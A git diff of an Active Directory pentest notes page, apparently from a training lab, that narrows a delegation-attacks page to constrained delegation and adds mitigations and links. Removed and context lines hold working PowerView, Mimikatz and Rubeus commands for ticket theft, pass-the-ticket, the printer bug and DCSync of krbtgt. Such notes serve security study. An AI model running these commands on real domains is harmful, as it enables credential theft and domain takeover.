@@ -1,7 +1,7 @@
 ---
-title: "Delegation Attacks"
-description: "Privilege escalation using delegation attacks."
-lead: "Using unconstrained and constrained delegation for privilege escalation in Active Directory with PowerView, Mimikatz, and Rubeus."
+title: "Constrained Delegation"
+description: "Privilege escalation using constrained delegation."
+lead: "Using constrained delegation for privilege escalation in Active Directory with PowerView, Mimikatz, and Rubeus."
 date: 2021-11-06T11:53:35+01:00
 lastmod: 2021-11-06T11:53:35+01:00
 draft: false
@@ -9,72 +9,11 @@ images: []
 menu: 
   active_directory:
     parent: "domain_privilege_escalation"
-weight: 30
+weight: 40
 toc: true
 ---
 
-## Unconstrained Delegation
-
-### General
-
-- When set for service account, allows delegation to any service to any resource on the domain as a user
-- When enabled, DC places user's TGT inside TGS when user requests access to service with unconstrained delegation enabled
-- Server extracts TGT from TGS and stores it in LSASS
-- Server can reuse the user's TGT to access resoruces
-- Escalate privileges when extracting TGT from Domain Admins or other HVTs
-- Note: need local admin access on the machine to extract tickets
-
-### Exploitation
-
-```powershell
-# Get computers that have unconstrained delegation enabled
-# Using PowerView
-Get-NetComputer -Unconstrained
-
-# Using AD Module
-Get-ADComputer -Filter { TrustedForDelegation -eq $true }
-Get-ADUser -Filter { TrustedForDelegation -eq $true }
-
-# Monitor DA logins on computer
-Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
-
-# Check if we have local admin access on that machine using PowerView
-Find-LocalAdminAccess -ComputerName dcorp-appsrv
-
-# Get session on machine as local admin and check for tickets
-Invoke-Mimikatz -Command '"sekurlsa::tickets"'
-
-# Export tickets
-Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
-
-# Inject ticket into session
-Invoke-Mimikatz -Command '"kerberos:ptt ticket.kirbi"'
-```
-
-### Printer Bug
-
-- Trick HVT to connect to machine with Unconstrained Delegation enabled
-- Feature of MS-RPRN allows any domain user (Authenticated User) to force any machine (running the Spooler service) to connect to a second machine of the user's choice
-- Force Domain Admin to connect to specific machine
-- https://github.com/leechristensen/SpoolSample
-
-```powershell
-# Start capturing for TGTs using Rubeus
-.\Rubeus.exe monitor /interval:5 /nowrap
-
-# Run MS-RPRN.exe
-.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appserv.dollarcorp.moneycorp.local
-
-# Copy base64 encoded TGT, remove extra spaces and inject it on attacker machine
-.\Rubeus.exe ptt /ticket:ticket.kirbi
-
-# Run DCSync
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
-```
-
-## Constrained Delegation
-
-### General
+## General
 
 - When enabled on a service account, allows access only to specified services on specified computers as a user
 - Typical scenario:
@@ -82,20 +21,20 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
   - Web services makes requests to database server to fetch results based on the user's authorization
 - To impersonate the user, Service for User (S4U) extension is used which provides two extensions
 
-#### Service for User to Self (S4U2self) Extension
+### Service for User to Self (S4U2self) Extension
 
 - Allows service to obtain a forwardable TGS to itself on behalf of a user
 - Only needs the user principal name but NO PASSWORD
 - Service account must have the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` - T2A4D UserAccountControl attribute set
 
-#### Service for User to Proxy (S4U2proxy) Extension
+### Service for User to Proxy (S4U2proxy) Extension
 
 - Allows service to obtain a TGS to a second service on behalf of a user
 - Uses the previously obtained TGS from S4U2self
 - Only allows access to services listed in the `msDS-AllowedToDelegateTo` attribute
 - Attribute contains list of SPNs to which the user tokens can be forwarded
 
-### Example Scenario: Constrained Delegation with Protocol Transition
+## Example Scenario: Constrained Delegation with Protocol Transition
 
 1. User (Joe) authenticates to web service running under `websvc` service account using non-Kerberos method
 2. Web service requests ticket from KDC for Joe without supplying a password, as the websvc account
@@ -107,9 +46,9 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 8. If SPN is listed there, KDC return TGS for dcorp-mssql (S4U2proxy)
 9. Web service can now authenticate to the CIFS on dcorp-mssql as Joe using the obtained TGS
 
-### Exploitation
+## Exploitation
 
-#### For Users with Constrained Delegation
+### For Users with Constrained Delegation
 
 - Requires access to the user/service account
 - If we can access it, we can access all the listed services in msDS-AllowedToDelegateTo attribute
@@ -143,7 +82,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt tgs.kirbi"'
 ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 ```
 
-#### For Computers with Constrained Delegation
+### For Computers with Constrained Delegation
 
 - Delegation occurs not only for specific service
 - Occurs for ANY service running under the same service account
@@ -177,6 +116,13 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 
 ## Mitigation
 
-- Limit DA/Admin logins to specific servers
+- Disable Kerberos delegation where possible
+- Limit DA/Admin logins to specific services
 - Set "Account is sensitive and cannot be delegated" for privileged accounts
-- https://docs.microsoft.com/en-us/archive/blogs/poshchap/security-focus-analysing-account-is-sensitive-and-cannot-be-delegated-for-privileged-accounts
+
+## Further Reading
+
+- [iRedTeam: Kerberos Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+- [HackTricks: Constrained Delegation](https://book.hacktricks.xyz/windows/active-directory-methodology/constrained-delegation)
+- [PayloadsAllTheThings: Kerberos Constrained Delegation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberos-constrained-delegation)
+- [ShenanigansLabs: Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
